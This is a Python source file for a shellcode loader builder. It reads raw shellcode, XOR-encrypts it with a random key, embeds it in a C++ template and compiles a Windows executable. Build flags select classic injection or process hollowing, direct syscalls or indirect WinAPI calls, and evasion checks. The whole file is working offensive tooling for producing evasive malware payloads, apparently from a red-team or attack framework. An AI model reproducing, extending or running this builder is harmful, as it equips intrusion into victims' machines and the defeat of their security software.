import os
import time
import random
import string
import subprocess
import logging
from controller.config import PROJECT_ROOT, OUTPUT_DIR, BUILD_DIR

class PayloadBuilder:
    def __init__(self, shellcode_path, options):
        self.shellcode_path = shellcode_path
        self.options = options
        self.logger = logging.getLogger("Builder")

    def _read_shellcode(self):
        try:
            with open(self.shellcode_path, 'rb') as f:
                return f.read()
        except FileNotFoundError:
            self.logger.error(f"Shellcode not found: {self.shellcode_path}")
            return None

    # --- STAGE 3: TRANSFORMATION IMPLEMENTATION ---
    def _encrypt_payload(self, raw_shellcode):
        method = self.options.get('encryption', 'none')
        key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
        
        if method == 'xor':
            self.logger.info(f"Applying Transformation: XOR Encryption (Key: {key})")
            encoded = bytearray(b ^ ord(key[i % len(key)]) for i, b in enumerate(raw_shellcode))
            return encoded, key
        else:
            return raw_shellcode, key

    def _generate_defines(self):
        defines = []
        # Mapping options to C++ macros
        if self.options.get('encryption') == 'xor': defines.append("-DENCRYPTION_XOR")
        
        # Stage 2 & 4 Mapping
        inj = self.options.get('injection')
        if inj == 'classic': defines.append("-DINJECTION_CLASSIC")
        elif inj == 'hollowing': defines.append("-DINJECTION_HOLLOWING")
        
        # API Obfuscation
        api = self.options.get('api_method')
        if api == 'syscalls': defines.append("-DUSE_DIRECT_SYSCALLS")
        elif api == 'winapi-indirect': defines.append("-DUSE_INDIRECT_WINAPI")
        
        # Stage 0
        if self.options.get('anti_evasion'): defines.append("-DEVASION_CHECKS_ENABLED")
        if self.options.get('debug'): defines.append("-DDEBUG_MODE")
        
        return " ".join(defines)

    def build(self):
        raw_sc = self._read_shellcode()
        if not raw_sc: return None

        # Process Stages 1 & 3
        final_sc, key = self._encrypt_payload(raw_sc)
        
        # Generate Source
        formatted_sc = "{" + ", ".join([f"0x{b:02x}" for b in final_sc]) + "};"
        
        try:
            with open(os.path.join(PROJECT_ROOT, 'src', 'main.cpp'), 'r') as f:
                template = f.read()
                
            code = template.replace("/*{{DEFINES}}*/", "") \
                           .replace("/*{{SHELLCODE}}*/", formatted_sc) \
                           .replace("/*{{SHELLCODE_LEN}}*/", str(len(final_sc))) \
                           .replace("/*{{KEY}}*/", f'"{key}"')
                           
            src_file = os.path.join(BUILD_DIR, 'generated_loader.cpp')
            with open(src_file, 'w') as f: f.write(code)
            
        except Exception as e:
            self.logger.error(f"Template generation failed: {e}")
            return None

        # Compilation
        output_name = f"payload_{int(time.time())}.exe"
        defines_str = self._generate_defines()
        
        # Clean & Build
        subprocess.run(["make", "clean"], cwd=PROJECT_ROOT, capture_output=True)
        os.makedirs(os.path.join(BUILD_DIR, "obj"), exist_ok=True)
        
        cmd = ["make", "build", f"SRC={os.path.basename(src_file)}", f"OUT={output_name}", f"DEFINES={defines_str}"]
        self.logger.info(f"Compiling with flags: {defines_str}")
        
        try:
            subprocess.run(cmd, cwd=PROJECT_ROOT, check=True, capture_output=True)
            full_path = os.path.join(OUTPUT_DIR, output_name)
            self.logger.info(f"Build Success: {full_path}")
            return full_path
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Build Failed!\n{e.stderr.decode()}")
            return None